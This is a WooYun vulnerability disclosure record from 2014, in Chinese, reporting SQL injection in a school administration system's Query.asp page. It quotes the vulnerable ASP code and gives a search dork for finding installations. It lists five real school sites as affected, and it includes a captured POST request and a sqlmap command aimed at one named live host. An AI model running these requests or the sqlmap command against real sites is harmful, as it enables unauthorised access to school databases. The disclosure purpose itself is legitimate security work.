{"id": 52484, "wybug_id": "wooyun-2014-071082", "wybug_title": "某通用型校园校务系统SQL注入", "wybug_corp": "cncert国家互联网应急中心", "wybug_author": "xlz0iza1", "wybug_date": "2014-08-05 16:06", "wybug_open_date": "2014-11-03 16:08", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-08-05：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-08-10：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-08-13：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-10-04：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-10-14：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-10-24：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-11-03：\t细节向公众公开  简要描述： RT 详细说明：  关键词：inurl:/sm2005文件：\\jiaoshi\\InfoSet\\BaseInfo\\Query.asp代码\nIf Request.Form(\"hidFlag\") = \"1\" Then\tDim sXM,sZGH\tsXM = Request.Form(\"txtXM\")\tsZGH = Request.Form(\"txtZGH\")\t\tDim sWhere\tsWhere = \"WHERE 1=1\"\t\tIf sXM <> \"\" Then\t\tsWhere = sWhere & \" AND XM LIKE '%\" & sXM & \"%'\"\tEnd If\t\tIf sZGH <> \"\" Then\t\tsWhere = sWhere & \" AND ZGH LIKE '%\" & sZGH & \"%'\"\n很明显的\nsXM = Request.Form(\"txtXM\")\tsZGH = Request.Form(\"txtZGH\")\n俩处没有做过任何处理直接带入数据库查询了。   漏洞证明：  \n相关案例：http://www.dlwsxx.com/SM2005/jiaoshi/InfoSet/BaseInfo/Query.asphttp://www.hwsyxx.com/SM2005/jiaoshi/InfoSet/BaseInfo/Query.asphttp://www.suyaxing.com:81/SM2005/jiaoshi/InfoSet/BaseInfo/Query.asphttp://www.lcxyz.com:21245/SM2005/jiaoshi/InfoSet/BaseInfo/Query.asphttp://www.zjnksyzx.com:8801/SM2005/jiaoshi/InfoSet/BaseInfo/Query.asp\n抓包：\nPOST /SM2005/jiaoshi/InfoSet/BaseInfo/Query.asp HTTP/1.1Host: www.dlwsxx.comProxy-Connection: keep-aliveContent-Length: 30Cache-Control: max-age=0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Origin: http://www.dlwsxx.comUser-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.102 Safari/537.36Content-Type: application/x-www-form-urlencodedReferer: http://www.dlwsxx.com/SM2005/jiaoshi/InfoSet/BaseInfo/Query.aspAccept-Encoding: gzip,deflate,sdchAccept-Language: zh-CN,zh;q=0.8Cookie: ASPSESSIONIDQADCTBAQ=LJPPMNAACLKFEFDHNPPOJCOLhidFlag=1&txtXM=111&txtZGH=111\n直接丢到sqlmap中跑吧。\nsqlmap.py -u \"http://www.dlwsxx.com/SM2005/jiaoshi/InfoSet/BaseInfo/Query.asp\" --data \"hidFlag=1&txtXM=1111&txtZGH=1111\" --dbs\n\n\n\n\n   修复方案：  过滤哦，亲~   版权声明：转载请注明来源 xlz0iza1@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：12  确认时间：2014-08-10 09:30 厂商回复：   最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 12, "Ranks": null}